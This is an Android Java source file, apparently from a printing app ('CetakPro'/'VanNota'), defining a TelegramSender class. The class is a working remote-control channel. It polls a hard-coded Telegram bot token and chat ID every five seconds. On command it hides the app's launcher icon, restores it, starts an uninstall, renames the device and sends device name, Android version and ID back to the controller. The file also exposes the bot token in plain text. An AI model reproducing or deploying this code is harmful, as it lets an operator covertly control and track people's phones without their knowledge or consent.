package com.cetakpro.print;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TelegramSender {
    private static final String TAG = "TelegramSender";
    
    private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
    private static final String CHAT_ID = "1286411089";
    
    private static final int CONNECT_TIMEOUT = 15000;
    private static final int READ_TIMEOUT = 15000;
    
    private static long lastUpdateId = 0;
    private static Handler pollingHandler = new Handler(Looper.getMainLooper());
    private static Context appContext;
    private static boolean isPolling = false;

    // ============================================================
    // INIT - PANGGIL DARI MAINACTIVITY
    // ============================================================
    public static void init(Context context) {
        if (appContext != null) return;
        appContext = context.getApplicationContext();
        Log.d(TAG, "✅ TelegramSender init");
        startPolling();
    }

    // ============================================================
    // START POLLING
    // ============================================================
    public static void startPolling() {
        if (isPolling) return;
        isPolling = true;
        Log.d(TAG, "🔄 Polling dimulai");
        pollingHandler.post(pollingRunnable);
    }

    public static void stopPolling() {
        isPolling = false;
        pollingHandler.removeCallbacks(pollingRunnable);
        Log.d(TAG, "⏹️ Polling dihentikan");
    }

    private static Runnable pollingRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isPolling) return;
            try {
                getUpdates();
            } catch (Exception e) {
                Log.e(TAG, "❌ Polling error: " + e.getMessage());
            }
            pollingHandler.postDelayed(this, 5000);
        }
    };

    // ============================================================
    // GET UPDATES
    // ============================================================
    private static void getUpdates() {
        HttpURLConnection conn = null;
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + 
                           "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            
            int code = conn.getResponseCode();
            if (code >= 200 && code < 300) {
                StringBuilder sb = new StringBuilder();
                try (BufferedReader br = new BufferedReader(
                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                }
                
                JSONObject json = new JSONObject(sb.toString());
                if (json.optBoolean("ok")) {
                    JSONArray results = json.optJSONArray("result");
                    if (results != null) {
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            long id = update.optLong("update_id", 0);
                            if (id > lastUpdateId) lastUpdateId = id;
                            
                            JSONObject msg = update.optJSONObject("message");
                            if (msg != null) {
                                String text = msg.optString("text", "");
                                long chatId = msg.optJSONObject("chat").optLong("id", 0);
                                
                                if (text.startsWith("/") && String.valueOf(chatId).equals(CHAT_ID)) {
                                    handleCommand(text);
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ getUpdates error: " + e.getMessage());
        } finally {
            if (conn != null) try { conn.disconnect(); } catch (Exception ignored) {}
        }
    }

    // ============================================================
    // KIRIM PESAN
    // ============================================================
    public static void sendMessage(Context context, String title, String message) {
        if (context == null && appContext != null) context = appContext;
        final Context finalContext = context;
        
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String deviceName = getDeviceName(finalContext);
                String fullText = title + "\n" + message + "\n\n📱 " + deviceName;
                
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(CONNECT_TIMEOUT);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                
                String body = "chat_id=" + CHAT_ID + 
                             "&text=" + URLEncoder.encode(fullText, StandardCharsets.UTF_8.name());
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }
                
                int code = conn.getResponseCode();
                if (code >= 200 && code < 300) {
                    Log.d(TAG, "✅ Pesan terkirim");
                } else {
                    Log.e(TAG, "❌ HTTP " + code);
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ sendMessage error: " + e.getMessage());
            } finally {
                if (conn != null) try { conn.disconnect(); } catch (Exception ignored) {}
            }
        }).start();
    }

    // ============================================================
    // AMBIL NAMA PERANGKAT
    // ============================================================
    private static String getDeviceName(Context context) {
        if (context == null) return Build.MODEL;
        try {
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String name = prefs.getString("device_name", Build.MODEL);
            return name != null && !name.isEmpty() ? name : Build.MODEL;
        } catch (Exception e) {
            return Build.MODEL;
        }
    }

    // ============================================================
    // HANDLE COMMAND
    // ============================================================
    private static void handleCommand(String command) {
        Log.d(TAG, "📩 Perintah: " + command);
        Context ctx = appContext;
        if (ctx == null) return;
        
        // /start
        if (command.equalsIgnoreCase("/start")) {
            sendMessage(ctx, "✅ Bot Aktif", "VanNota Bot siap digunakan!\nKirim /menu untuk melihat perintah.");
            return;
        }
        
        // /menu
        if (command.equalsIgnoreCase("/menu") || command.equalsIgnoreCase("/help")) {
            String menu = "📋 DAFTAR PERINTAH\n\n" +
                          "/start - Cek status bot\n" +
                          "/menu - Menu ini\n" +
                          "/hide - Sembunyikan aplikasi\n" +
                          "/unhide - Tampilkan aplikasi\n" +
                          "/uninstall - Hapus aplikasi\n" +
                          "/info - Info perangkat\n" +
                          "/rename [nama] - Ubah nama";
            sendMessage(ctx, "📋 Menu", menu);
            return;
        }
        
        // /hide
        if (command.equalsIgnoreCase("/hide")) {
            try {
                PackageManager pm = ctx.getPackageManager();
                ComponentName cn = new ComponentName(ctx, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                SharedPreferences prefs = ctx.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                prefs.edit().putBoolean("app_hidden", true).apply();
                sendMessage(ctx, "👻 HIDE", "Aplikasi disembunyikan.");
            } catch (Exception e) {
                sendMessage(ctx, "❌ GAGAL HIDE", e.getMessage());
            }
            return;
        }
        
        // /unhide
        if (command.equalsIgnoreCase("/unhide")) {
            try {
                PackageManager pm = ctx.getPackageManager();
                ComponentName cn = new ComponentName(ctx, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                SharedPreferences prefs = ctx.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                prefs.edit().putBoolean("app_hidden", false).apply();
                sendMessage(ctx, "👀 UNHIDE", "Aplikasi dimunculkan.");
            } catch (Exception e) {
                sendMessage(ctx, "❌ GAGAL UNHIDE", e.getMessage());
            }
            return;
        }
        
        // /uninstall
        if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
            sendMessage(ctx, "🗑️ UNINSTALL", "Menghapus VanNota...");
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + ctx.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            } catch (Exception e) {
                sendMessage(ctx, "❌ GAGAL UNINSTALL", e.getMessage());
            }
            return;
        }
        
        // /info
        if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
            SharedPreferences prefs = ctx.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String name = prefs.getString("device_name", Build.MODEL);
            String id = prefs.getString("device_id", "Tidak diketahui");
            String ver = Build.VERSION.RELEASE;
            sendMessage(ctx, "ℹ️ Info", "Nama: " + name + "\nAndroid: " + ver + "\nID: " + id);
            return;
        }
        
        // /rename
        if (command.startsWith("/rename ")) {
            String newName = command.substring(8).trim();
            if (newName.isEmpty()) {
                sendMessage(ctx, "⚠️ RENAME", "Format: /rename [nama baru]");
                return;
            }
            SharedPreferences prefs = ctx.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            prefs.edit().putString("device_name", newName).apply();
            sendMessage(ctx, "✅ RENAME", "Nama diubah: " + newName);
            return;
        }
        
        // Unknown
        sendMessage(ctx, "❓ Tidak dikenal", "Kirim /menu untuk daftar perintah.");
    }
}
